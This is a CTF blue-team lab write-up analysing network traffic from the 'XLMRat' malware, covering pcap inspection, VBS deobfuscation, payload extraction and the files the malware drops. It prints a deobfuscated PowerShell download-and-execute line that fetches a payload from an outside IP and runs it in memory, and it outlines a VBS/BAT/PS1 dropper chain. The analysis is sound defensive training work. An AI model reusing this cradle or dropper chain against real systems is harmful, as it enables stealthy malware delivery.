CyberDefenders CTF Lab XLMRat
---

https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/

#### Scenario

Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT&CK, focusing on stealthy execution and reflective code loading.


#### Machine Environment 

- Windows 10 running in VMware workstation
- Flare Windows Install https://github.com/mandiant/flare-vm
- WireShark


### 1.  The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?
---

This pcap consists of 2 host conversations.
	
Wireshark -> Statistics -> Conversations

![image](https://github.com/user-attachments/assets/fe8eb902-92f8-42c3-86f2-251547f74dae)

The first GET request is for a xlm.txt file sourced from 10.1.9.101 and destined to 45.126.209.4

![image](https://github.com/user-attachments/assets/5387616c-63b1-4456-883b-c174120e23e0)

Use WireShark to export the HTTP files to your Windows Flare VM
	
File -> Export Objects -> HTTP

![image](https://github.com/user-attachments/assets/43b4cef2-81a7-46b1-93e1-0bba88230c9c)

The xlm.txt file contains a Visual Basic Script (VBS) that declares an array and stores pieces of code that get concatenated using a for loop.

![image](https://github.com/user-attachments/assets/bf331842-daba-41a5-abca-11a863e6ae8d)

***RUN CODE AT YOUR OWN RISK
 
By placing the wscript.echo command we can view the output of the variable to the console.

![image](https://github.com/user-attachments/assets/96a50816-aebd-4861-b747-3c543bc282e9)

Open a command prompt and run the .vbs file with cscript.exe displaying the output. 

![image](https://github.com/user-attachments/assets/14dea8b7-4225-46fc-9493-9841ff497ff3)

Bring the output into a text editor and clean it up.  The "[BYTe[]]" lines are not useful and probably a way to confuse people and machine.  

	$A123 = "IeX(NeW-OBJeCT NeT.W"
	$B456 = "eBCLIeNT).DOWNLO"
	$C789 = "'VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN','ADSTRING')"
	IeX($A123+$B456+$C789)

This script downloads the first stage of malware and executes in into memory using Invoke-Expression (IeX)

### 2.  
Which hosting provider owns the associated IP address?
---

Using a web site like https://whois.domaintools.com/ shows the hosting provider name.

![image](https://github.com/user-attachments/assets/bd612ade-da08-4bc9-9dff-108e6e7c696e)

### 3.  By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?
---

Analyzing the mdm.jpg file we open it with a text editor to see two long HEX variables with some PowerShell and VBS code.  Lets isolate both HEX variables into their own files and convert those HEX files to executable.  Part of the mdm.jpg file has the script needed to convert since it performs those actions when run.  

![image](https://github.com/user-attachments/assets/704145a1-65f9-4ed7-bc55-6f53e6a4fb87)

Create a simple PowerShell script to convert both HEX values to executables.

![image](https://github.com/user-attachments/assets/33894fb9-3ff8-446f-8a38-8a1c6968e6b2)

Both newly created file details show their original filename.  Stub.exe and NewPE2.dll		

![image](https://github.com/user-attachments/assets/91988140-e6d6-4e92-8c7f-8bb3dc715949)

Get the SHA256 of the Stub.exe file as this is the malware executable

![image](https://github.com/user-attachments/assets/0d421874-af85-4e08-a789-8e78e273b443)

### 4.  What is the malware family label based on Alibaba?
---

![image](https://github.com/user-attachments/assets/df479b8a-70b9-436d-b932-7ca89e7f147b)


### 5.  What is the timestamp of the malware's creation?
---

![image](https://github.com/user-attachments/assets/ee901fd2-baf2-4b3e-9e8f-4875befbb5d6)

### 6.  Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.
---

We can grab the portion of LOLBin code and run it independently giving us the path.

![image](https://github.com/user-attachments/assets/13cc40ff-696e-48e3-b7a6-887eeb74c973)

### 7.  The script is designed to drop several files. List the names of the files dropped by the script.
---

	-The malware creates a PowerShell script (conted.ps1) containing the 2 HEX variables and loads NewPE2.dll
	-Then creates a batch file (conted.bat) which uses powershell.exe to run the ps1 file.
	-Finally creating a VBS file (conted.vbs) which leverages WScript.shell to run conted.bat

![image](https://github.com/user-attachments/assets/f4c95d80-08c0-4a0f-9bd6-1658b410fe33)
![image](https://github.com/user-attachments/assets/750c2c1c-7c0a-4c1b-af10-8c002f41ce4c)























